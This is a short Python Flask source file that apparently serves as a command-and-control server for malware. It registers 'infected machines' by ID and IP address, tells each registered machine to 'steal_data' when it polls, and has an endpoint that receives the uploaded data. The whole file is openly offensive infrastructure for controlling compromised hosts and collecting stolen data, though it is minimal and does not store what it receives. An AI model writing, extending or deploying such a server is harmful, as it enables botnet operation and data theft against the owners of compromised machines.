
from flask import Flask, request, jsonify
import json
import time

app = Flask(__name__)
infected_machines = {}

@app.route('/register', methods=['POST'])
def register_machine():
    data = request.json
    machine_id = data.get('machine_id')
    ip_address = request.remote_addr
    
    infected_machines[machine_id] = {
        'ip': ip_address,
        'last_seen': time.time(),
        'status': 'active'
    }
    
    return jsonify({'status': 'registered'})

@app.route('/command/<machine_id>', methods=['GET'])
def get_command(machine_id):
    if machine_id in infected_machines:
        return jsonify({'command': 'steal_data'})
    return jsonify({'command': 'none'})

@app.route('/data/<machine_id>', methods=['POST'])
def receive_data(machine_id):
    if machine_id in infected_machines:
        data = request.json
        return jsonify({'status': 'received'})
    return jsonify({'status': 'error'})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
